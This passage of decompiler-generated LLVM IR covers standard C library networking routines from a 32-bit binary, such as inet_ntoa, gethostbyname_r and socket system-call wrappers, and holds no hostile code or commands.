  %v2_8053783 = add i32 %v1_8053783, ptrtoint ([5 x i8*]* @global_var_805cd88.510 to i32)
  %v3_8053783 = inttoptr i32 %v2_8053783 to i32*
  %v4_8053783 = load i32, i32* %v3_8053783, align 4
  store i32 %v4_8053783, i32* @edx, align 4
  br label %dec_label_pc_805378a

dec_label_pc_805378a:                             ; preds = %dec_label_pc_8053772, %dec_label_pc_8053783
  %v0_805378d = phi i32 [ ptrtoint ([15 x i8]* @global_var_805cd9c.504 to i32), %dec_label_pc_8053772 ], [ %v4_8053783, %dec_label_pc_8053783 ]
  %v0_805378e = load i32, i32* @esi, align 4
  %v0_8053795 = load i32, i32* inttoptr (i32 134603260 to i32*), align 4
  %v9_805379b = call i32 @fprintf(i32 %v0_8053795, i32 ptrtoint ([8 x i8]* @global_var_805cd1a.513 to i32), i32 %v4_805375b, i32 %v0_805378e, i32 %v0_805378d)
  ret i32 %v9_805379b

; uselistorder directives
  uselistorder i32 ptrtoint ([15 x i8]* @global_var_805cd9c.504 to i32), { 0, 2, 1 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805378a, { 1, 0 }
  uselistorder label %dec_label_pc_8053772, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80537a8 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_80537ab = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_80537ae = load i32, i32* @ebx, align 4
  store i32 %v0_80537ae, i32* %stack_var_-12, align 4
  %v1_80537b7 = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_80537b7, 16777216
  %v1_80537b9 = sdiv i32 %sext, 16777216
  store i32 %v1_80537b9, i32* @ebx, align 4
  %v1_80537bb = add i32 %arg2, 15
  store i32 %v1_80537bb, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80537c0

dec_label_pc_80537c0:                             ; preds = %entry, %dec_label_pc_80537e5
  %v0_80537c717 = phi i32 [ %v1_80537b9, %entry ], [ %v2_80537e5, %dec_label_pc_80537e5 ]
  %v0_80537f116 = phi i32 [ %v1_80537bb, %entry ], [ %v0_80537e9, %dec_label_pc_80537e5 ]
  %v1_80537cb = urem i32 %v0_80537c717, 256
  %v5_80537d3 = inttoptr i32 %v0_80537f116 to i8*
  %v6_80537d3 = call i32 @_uintmaxtostr(i8* %v5_80537d3, i32 %v1_80537cb, i32 0, i32 -10, i32 0)
  %v0_80537db = load i32, i32* @esi, align 4
  %v1_80537db = icmp eq i32 %v0_80537db, 0
  %v1_80537dd = add i32 %v6_80537d3, -1
  store i32 %v1_80537dd, i32* %ecx.global-to-local, align 4
  br i1 %v1_80537db, label %dec_label_pc_80537e5, label %dec_label_pc_80537e2

dec_label_pc_80537e2:                             ; preds = %dec_label_pc_80537c0
  %v1_80537e2 = inttoptr i32 %v0_80537db to i8*
  store i8 46, i8* %v1_80537e2, align 1
  %v0_80537e9.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80537e5

dec_label_pc_80537e5:                             ; preds = %dec_label_pc_80537c0, %dec_label_pc_80537e2
  %v0_80537e9 = phi i32 [ %v1_80537dd, %dec_label_pc_80537c0 ], [ %v0_80537e9.pre, %dec_label_pc_80537e2 ]
  %v0_80537e5 = load i32, i32* @ebx, align 4
  %v2_80537e5 = udiv i32 %v0_80537e5, 256
  store i32 %v2_80537e5, i32* @ebx, align 4
  %v0_80537e8 = load i32, i32* @edi, align 4
  %v1_80537e8 = add i32 %v0_80537e8, 1
  store i32 %v1_80537e8, i32* @edi, align 4
  store i32 %v0_80537e9, i32* @esi, align 4
  %v7_80537ee = icmp sgt i32 %v1_80537e8, 3
  br i1 %v7_80537ee, label %dec_label_pc_80537f0, label %dec_label_pc_80537c0

dec_label_pc_80537f0:                             ; preds = %dec_label_pc_80537e5
  %v2_80537f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80537f0, i32* @ebx, align 4
  %v1_80537f1 = add i32 %v0_80537e9, 1
  store i32 %v0_80537ab, i32* @esi, align 4
  store i32 %v0_80537a8, i32* @edi, align 4
  ret i32 %v1_80537f1

; uselistorder directives
  uselistorder i32 %v0_80537e9, { 0, 2, 1 }
  uselistorder i32 %v1_80537b9, { 1, 0 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80537e5, { 1, 0 }
  uselistorder label %dec_label_pc_80537c0, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_8053803 = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_80644c4.514 to i32))
  ret i32 %v2_8053803
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805380f = ptrtoint i32* %stack_var_-4 to i32
  %v2_8053818 = inttoptr i32 %arg1 to i8*
  %v3_8053818 = call i32 @inet_aton(i8* %v2_8053818, i32 %v2_805380f)
  %v1_8053823 = icmp eq i32 %v3_8053818, 0
  br i1 %v1_8053823, label %dec_label_pc_805382b, label %dec_label_pc_8053827

dec_label_pc_8053827:                             ; preds = %entry
  %v3_8053827 = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805382b

dec_label_pc_805382b:                             ; preds = %entry, %dec_label_pc_8053827
  %v0_805382b = phi i32 [ -1, %entry ], [ %v3_8053827, %dec_label_pc_8053827 ]
  ret i32 %v0_805382b

; uselistorder directives
  uselistorder label %dec_label_pc_805382b, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8053837 = call i32 @__GI___h_errno_location()
  %v0_805383c = load i32, i32* @edx, align 4
  %v2_805383f = ptrtoint i32* %stack_var_-4 to i32
  %v9_8053857 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80646ac.516, i32 ptrtoint (i32* @global_var_80644e0.515 to i32), i32 460, i32 %v2_805383f, i32 %v0_8053837, i32 %v0_805383c, i32 %v0_805383c)
  %v3_805385c = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805385c
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_1()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8053864 = load i32, i32* @ebp, align 4
  %v0_8053865 = load i32, i32* @edi, align 4
  %v0_8053866 = load i32, i32* @esi, align 4
  %v0_8053867 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8053877 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8053877, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8053882 = icmp eq i32 %arg1, 0
  br i1 %v4_8053882, label %dec_label_pc_8053b8e, label %dec_label_pc_805388d

dec_label_pc_805388d:                             ; preds = %entry
  %v1_805388d = call i32 @__errno_location(i32 %v0_8053867)
  store i32 %v1_805388d, i32* %eax.global-to-local, align 4
  %v1_8053892 = inttoptr i32 %v1_805388d to i32*
  %v2_8053892 = load i32, i32* %v1_8053892, align 4
  store i32 %v2_8053892, i32* @edi, align 4
  store i32 %v1_805388d, i32* @esi, align 4
  store i32 0, i32* %v1_8053892, align 4
  %v0_80538a5 = load i32, i32* @ebx, align 4
  store i32 %v0_80538a5, i32* %stack_var_-108, align 4
  %v7_80538b1 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_80538a5, i32 %arg5, i32 %arg6, i32 %v1_805388d)
  store i32 %v7_80538b1, i32* %eax.global-to-local, align 4
  %v1_80538b9 = icmp eq i32 %v7_80538b1, 0
  br i1 %v1_80538b9, label %dec_label_pc_8053b8e, label %dec_label_pc_80538c1

dec_label_pc_80538c1:                             ; preds = %dec_label_pc_805388d
  store i32 %arg6, i32* @ecx, align 4
  %v1_80538c5 = inttoptr i32 %arg6 to i32*
  %v2_80538c5 = load i32, i32* %v1_80538c5, align 4
  store i32 %v2_80538c5, i32* %edx.global-to-local, align 4
  %v9_80538c7 = icmp eq i32 %v2_80538c5, 1
  br i1 %v9_80538c7, label %dec_label_pc_80538e1, label %dec_label_pc_80538cc

dec_label_pc_80538cc:                             ; preds = %dec_label_pc_80538c1
  %v9_80538cc = icmp eq i32 %v2_80538c5, 4
  br i1 %v9_80538cc, label %dec_label_pc_80538e1, label %dec_label_pc_80538d1

dec_label_pc_80538d1:                             ; preds = %dec_label_pc_80538cc
  %v1_80538d1 = add i32 %v2_80538c5, 1
  %v8_80538d1 = icmp eq i32 %v1_80538d1, 0
  store i32 %v1_80538d1, i32* %edx.global-to-local, align 4
  %v1_80538d2 = icmp eq i1 %v8_80538d1, false
  br i1 %v1_80538d2, label %dec_label_pc_8053b8e, label %dec_label_pc_80538d8

dec_label_pc_80538d8:                             ; preds = %dec_label_pc_80538d1
  %v0_80538d8 = load i32, i32* @esi, align 4
  %v1_80538d8 = inttoptr i32 %v0_80538d8 to i32*
  %v2_80538d8 = load i32, i32* %v1_80538d8, align 4
  %v11_80538d8 = icmp eq i32 %v2_80538d8, 2
  %v1_80538db = icmp eq i1 %v11_80538d8, false
  br i1 %v1_80538db, label %dec_label_pc_8053b8e, label %dec_label_pc_80538e1

dec_label_pc_80538e1:                             ; preds = %dec_label_pc_80538d8, %dec_label_pc_80538cc, %dec_label_pc_80538c1
  %v0_80538e1 = load i32, i32* @ebp, align 4
  %v1_80538e3 = sub i32 0, %v0_80538e1
  %v1_80538e5 = urem i32 %v1_80538e3, 4
  %v2_80538e5 = icmp eq i32 %v1_80538e5, 0
  store i32 %v1_80538e5, i32* %eax.global-to-local, align 4
  %v0_80538e8 = load i32, i32* @edi, align 4
  %v1_80538e8 = load i32, i32* @esi, align 4
  %v2_80538e8 = inttoptr i32 %v1_80538e8 to i32*
  store i32 %v0_80538e8, i32* %v2_80538e8, align 4
  %v0_80538fc.pre = load i32, i32* @ebx, align 4
  br i1 %v2_80538e5, label %dec_label_pc_80538f8, label %dec_label_pc_80538ec

dec_label_pc_80538ec:                             ; preds = %dec_label_pc_80538e1
  %v1_80538ec = load i32, i32* %eax.global-to-local, align 4
  %v2_80538ec = sub i32 %v0_80538fc.pre, %v1_80538ec
  %v7_80538ec = icmp ult i32 %v0_80538fc.pre, %v1_80538ec
  br i1 %v7_80538ec, label %dec_label_pc_8053b89, label %dec_label_pc_80538f4

dec_label_pc_80538f4:                             ; preds = %dec_label_pc_80538ec
  %v0_80538f4 = load i32, i32* @ebp, align 4
  %v2_80538f4 = add i32 %v0_80538f4, %v1_80538ec
  store i32 %v2_80538f4, i32* @ebp, align 4
  store i32 %v2_80538ec, i32* @ebx, align 4
  br label %dec_label_pc_80538f8

dec_label_pc_80538f8:                             ; preds = %dec_label_pc_80538e1, %dec_label_pc_80538f4
  %v0_80538fc = phi i32 [ %v2_80538ec, %dec_label_pc_80538f4 ], [ %v0_80538fc.pre, %dec_label_pc_80538e1 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_80538c5, align 4
  %tmp41 = icmp ult i32 %v0_80538fc, 4
  br i1 %tmp41, label %dec_label_pc_8053b89, label %dec_label_pc_805390b

dec_label_pc_805390b:                             ; preds = %dec_label_pc_80538f8
  %v0_805390b = load i32, i32* @ebx, align 4
  %v1_805390b = add i32 %v0_805390b, -4
  store i32 %v1_805390b, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_805390b, 8
  br i1 %tmp42, label %dec_label_pc_8053b89, label %dec_label_pc_8053917

dec_label_pc_8053917:                             ; preds = %dec_label_pc_805390b
  %v1_8053917 = add i32 %v0_805390b, -12
  store i32 %v1_8053917, i32* %eax.global-to-local, align 4
  %v0_805391a = load i32, i32* @ebp, align 4
  %v1_805391a = add i32 %v0_805391a, 4
  store i32 %v1_805391a, i32* %edx.global-to-local, align 4
  store i32 %v1_805391a, i32* %stack_var_-92, align 4
  %v3_8053923 = inttoptr i32 %v1_805391a to i32*
  store i32 %v0_805391a, i32* %v3_8053923, align 4
  %v0_8053926 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053926 = add i32 %v0_8053926, 4
  %v2_8053926 = inttoptr i32 %v1_8053926 to i32*
  store i32 0, i32* %v2_8053926, align 4
  %tmp43 = icmp ult i32 %v1_8053917, 32
  br i1 %tmp43, label %dec_label_pc_8053b89, label %dec_label_pc_8053933

dec_label_pc_8053933:                             ; preds = %dec_label_pc_8053917
  %v0_8053933 = load i32, i32* @ebx, align 4
  %v1_8053933 = add i32 %v0_8053933, -44
  store i32 %v1_8053933, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8053933, 256
  br i1 %tmp44, label %dec_label_pc_8053b89, label %dec_label_pc_8053946

dec_label_pc_8053946:                             ; preds = %dec_label_pc_8053933
  %v0_8053946 = load i32, i32* @ebp, align 4
  %v1_8053946 = add i32 %v0_8053946, 12
  %v1_805394d = add i32 %v0_8053946, 44
  store i32 %v1_805394d, i32* @edi, align 4
  store i32 %v1_805394d, i32* %stack_var_-108, align 4
  %v3_805395a = inttoptr i32 %v1_805394d to i8*
  %v4_805395a = call i32 @strncpy(i8* %v3_805395a, i32 %arg1, i32 %v1_8053933)
  %v0_805395f = load i32, i32* @edi, align 4
  %v1_805395f = load i32, i32* @ebp, align 4
  %v2_805395f = add i32 %v1_805395f, 12
  %v3_805395f = inttoptr i32 %v2_805395f to i32*
  store i32 %v0_805395f, i32* %v3_805395f, align 4
  %v1_8053966 = add i32 %v0_8053946, 16
  %v2_8053966 = inttoptr i32 %v1_8053966 to i32*
  store i32 0, i32* %v2_8053966, align 4
  %v2_805396d = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805396d, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805396f = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8053974 = inttoptr i32 %arg1 to i8*
  %v3_8053974 = call i32 @inet_aton(i8* %v2_8053974, i32 %v0_805396f)
  store i32 %v3_8053974, i32* %eax.global-to-local, align 4
  %v1_805397c = icmp eq i32 %v3_8053974, 0
  br i1 %v1_805397c, label %dec_label_pc_80539b8, label %dec_label_pc_8053980

dec_label_pc_8053980:                             ; preds = %dec_label_pc_8053946
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8053984 = load i32, i32* @edi, align 4
  store i32 %v0_8053984, i32* %arg2, align 4
  %v1_8053986 = add i32 %tmp18, 8
  %v2_8053986 = inttoptr i32 %v1_8053986 to i32*
  store i32 2, i32* %v2_8053986, align 4
  %v0_805398d = load i32, i32* %edx.global-to-local, align 4
  %v1_805398d = add i32 %v0_805398d, 12
  %v2_805398d = inttoptr i32 %v1_805398d to i32*
  store i32 4, i32* %v2_805398d, align 4
  %v2_8053994 = load i32, i32* %stack_var_-92, align 4
  %v1_8053997 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053997 = add i32 %v1_8053997, 16
  %v3_8053997 = inttoptr i32 %v2_8053997 to i32*
  store i32 %v2_8053994, i32* %v3_8053997, align 4
  %v1_805399e = load i32, i32* %edx.global-to-local, align 4
  %v2_805399e = add i32 %v1_805399e, 4
  %v3_805399e = inttoptr i32 %v2_805399e to i32*
  store i32 %v1_8053946, i32* %v3_805399e, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_80539a5 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80539a5, i32* %v1_8053877, align 4
  store i32 0, i32* %v1_80538c5, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b8e

dec_label_pc_80539b8:                             ; preds = %dec_label_pc_8053946
  %v0_80539b8 = call i32 @__open_nameservers()
  store i32 %v0_80539b8, i32* @eax, align 4
  %v2_80539c8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_80539c8, i32* @ebx, align 4
  store i32 %v2_80539c8, i32* %stack_var_-108, align 4
  %v2_80539cd = call i32 @__pthread_return_void(i32 %v2_80539c8, i32 134567263)
  store i32 %v2_80539cd, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* %stack_var_-108, align 4
  %v1_80539d9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805e448.517 to i32))
  %v0_80539de = load i32, i32* @global_var_8064b34.518, align 4
  store i32 %v0_80539de, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_805e448.517 to i32), i32* @ecx, align 4
  store i32 134567263, i32* @eax, align 4
  store i32 %v2_80539c8, i32* %stack_var_-108, align 4
  %v2_80539e9 = call i32 @__pthread_return_void(i32 %v2_80539c8, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_8053a04 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8053a09 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8053a09, i32* %eax.global-to-local, align 4
  store i32 %v2_8053a09, i32* %stack_var_-108, align 4
  %v0_8053a13 = load i32, i32* @esi, align 4
  %v7_8053a1a = call i32 @__dns_lookup(i8* %v2_8053974, i32 1, i32 %v0_8053a13, i32 ptrtoint (i32* @global_var_8064b28.519 to i32), i32 %v2_8053a09, i32 %v2_8053a04)
  store i32 %v7_8053a1a, i32* %eax.global-to-local, align 4
  %v2_8053a22 = icmp slt i32 %v7_8053a1a, 0
  %v1_8053a24 = icmp eq i1 %v2_8053a22, false
  br i1 %v1_8053a24, label %dec_label_pc_8053a3a, label %dec_label_pc_8053a26

dec_label_pc_8053a26:                             ; preds = %dec_label_pc_80539b8
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_80538c5, align 4
  br label %dec_label_pc_8053b8e

dec_label_pc_8053a3a:                             ; preds = %dec_label_pc_80539b8
  %v4_8053a3a = trunc i64 %tmp11 to i32
  store i32 %v4_8053a3a, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_8053a4d = icmp ugt i32 %v1_8053933, 256
  %v15_8053a4d = icmp eq i32 %v0_8053933, 300
  %v2_8053a51 = or i1 %v10_8053a4d, %v15_8053a4d
  br i1 %v2_8053a51, label %dec_label_pc_8053aec, label %dec_label_pc_8053a53

dec_label_pc_8053a53:                             ; preds = %dec_label_pc_8053a3a
  %v3_8053a56 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053a56, i32* %stack_var_-108, align 4
  %v1_8053a5a = call i32 @free(i32 %v3_8053a56)
  store i32 %v1_8053a5a, i32* %eax.global-to-local, align 4
  store i32 %v3_8053a56, i32* @edi, align 4
  %v3_8053a60 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053a60, i32* %stack_var_-108, align 4
  %v1_8053a64 = call i32 @free(i32 %v3_8053a60)
  store i32 -1, i32* %v1_80538c5, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b64

dec_label_pc_8053aec:                             ; preds = %dec_label_pc_8053a3a
  %v3_8053af1.pre = load i32, i32* %stack_var_-76, align 4
  %v0_8053af5.pre = load i32, i32* @edi, align 4
  store i32 %v0_8053af5.pre, i32* %stack_var_-108, align 4
  %v3_8053af6 = inttoptr i32 %v0_8053af5.pre to i8*
  %v4_8053af6 = call i32 @strncpy(i8* %v3_8053af6, i32 %v3_8053af1.pre, i32 %v1_8053933)
  store i32 %v4_8053af6, i32* %eax.global-to-local, align 4
  store i32 %v0_8053af5.pre, i32* @ecx, align 4
  %v3_8053afc = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_8053afc, i32* %stack_var_-108, align 4
  %v1_8053b00 = call i32 @free(i32 %v3_8053afc)
  store i32 %v1_8053b00, i32* %eax.global-to-local, align 4
  %v12_8053b08 = icmp eq i32 %tmp10, 1
  %v1_8053b0d = icmp eq i1 %v12_8053b08, false
  br i1 %v1_8053b0d, label %dec_label_pc_8053b69, label %dec_label_pc_8053b0f

dec_label_pc_8053b0f:                             ; preds = %dec_label_pc_8053aec
  %v0_8053b0f = load i32, i32* @edx, align 4
  %v0_8053b16 = load i32, i32* @ebp, align 4
  store i32 %v0_8053b16, i32* %stack_var_-108, align 4
  %v3_8053b17 = inttoptr i32 %tmp to i16*
  %v4_8053b17 = call i32 @memcpy(i16* %v3_8053b17, i32 4, i32 %v0_8053b0f)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_8053b20 = load i32, i32* @edi, align 4
  store i32 %v0_8053b20, i32* %arg2, align 4
  %v1_8053b22 = add i32 %tmp18, 8
  %v2_8053b22 = inttoptr i32 %v1_8053b22 to i32*
  store i32 2, i32* %v2_8053b22, align 4
  %v0_8053b29 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053b29 = add i32 %v0_8053b29, 12
  %v2_8053b29 = inttoptr i32 %v1_8053b29 to i32*
  store i32 4, i32* %v2_8053b29, align 4
  %v3_8053b30 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_8053b30, i32* %edx.global-to-local, align 4
  %v1_8053b34 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053b34 = add i32 %v1_8053b34, 16
  %v3_8053b34 = inttoptr i32 %v2_8053b34 to i32*
  store i32 %v3_8053b30, i32* %v3_8053b34, align 4
  %v1_8053b3b = load i32, i32* %eax.global-to-local, align 4
  %v2_8053b3b = add i32 %v1_8053b3b, 4
  %v3_8053b3b = inttoptr i32 %v2_8053b3b to i32*
  store i32 %v1_8053946, i32* %v3_8053b3b, align 4
  %v2_8053b3e = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8053b3e, i32* %eax.global-to-local, align 4
  %v3_8053b3f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053b3f, i32* %stack_var_-108, align 4
  %v1_8053b43 = call i32 @free(i32 %v3_8053b3f)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8053877, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_80538c5, align 4
  br label %dec_label_pc_8053b64

dec_label_pc_8053b64:                             ; preds = %dec_label_pc_8053b69, %dec_label_pc_8053a53, %dec_label_pc_8053b0f
  br label %dec_label_pc_8053b8e

dec_label_pc_8053b69:                             ; preds = %dec_label_pc_8053aec
  %v3_8053b6c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_8053b6c, i32* %stack_var_-108, align 4
  %v1_8053b70 = call i32 @free(i32 %v3_8053b6c)
  store i32 1, i32* %v1_80538c5, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b64

dec_label_pc_8053b89:                             ; preds = %dec_label_pc_8053933, %dec_label_pc_8053917, %dec_label_pc_805390b, %dec_label_pc_80538f8, %dec_label_pc_80538ec
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053b8e

dec_label_pc_8053b8e:                             ; preds = %dec_label_pc_80538d8, %dec_label_pc_80538d1, %dec_label_pc_805388d, %entry, %dec_label_pc_8053b64, %dec_label_pc_8053a26, %dec_label_pc_8053980, %dec_label_pc_8053b89
  store i32 %v0_8053867, i32* @ebx, align 4
  store i32 %v0_8053866, i32* @esi, align 4
  store i32 %v0_8053865, i32* @edi, align 4
  store i32 %v0_8053864, i32* @ebp, align 4
  %v0_8053b95 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053b95

; uselistorder directives
  uselistorder i32 %v2_80539c8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_805394d, { 1, 0, 2 }
  uselistorder i32 %v1_8053946, { 1, 0 }
  uselistorder i32 %v1_8053933, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80538fc.pre, { 0, 2, 1 }
  uselistorder i32 %v1_80538e5, { 1, 0 }
  uselistorder i32 %v2_80538c5, { 2, 0, 1, 3 }
  uselistorder i32* %v1_80538c5, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8053877, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 2, 0, 1 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8053b8e, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8053b64, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80538f8, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053bb3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053bba = call i32 @__socketcall(i32 3, i32 %v2_8053bb3)
  ret i32 %v2_8053bba

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053bdf = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053be6 = call i32 @__socketcall(i32 6, i32 %v2_8053bdf)
  ret i32 %v2_8053be6

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053c1b = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053c22 = call i32 @__socketcall(i32 15, i32 %v2_8053c1b)
  ret i32 %v2_8053c22

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053c4f = ptrtoint i32* %stack_var_-16 to i32
  %v2_8053c56 = call i32 @__socketcall(i32 10, i32 %v2_8053c4f)
  ret i32 %v2_8053c56

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_8053c83 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8053c8a = call i32 @__socketcall(i32 9, i32 %v2_8053c83)
  ret i32 %v2_8053c8a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053cc7 = ptrtoint i32* %stack_var_-24 to i32
  %v2_8053cce = call i32 @__socketcall(i32 11, i32 %v2_8053cc7)
  ret i32 %v2_8053cce

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_8053d03 = ptrtoint i32* %stack_var_-20 to i32
  %v2_8053d0a = call i32 @__socketcall(i32 14, i32 %v2_8053d03)
  ret i32 %v2_8053d0a

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_8053d2f = ptrtoint i32* %stack_var_-12 to i32
  %v2_8053d36 = call i32 @__socketcall(i32 1, i32 %v2_8053d2f)
  ret i32 %v2_8053d36

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 3, 7, 6, 0, 1, 5, 2, 4 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_8053d58, label %dec_label_pc_8053d4b

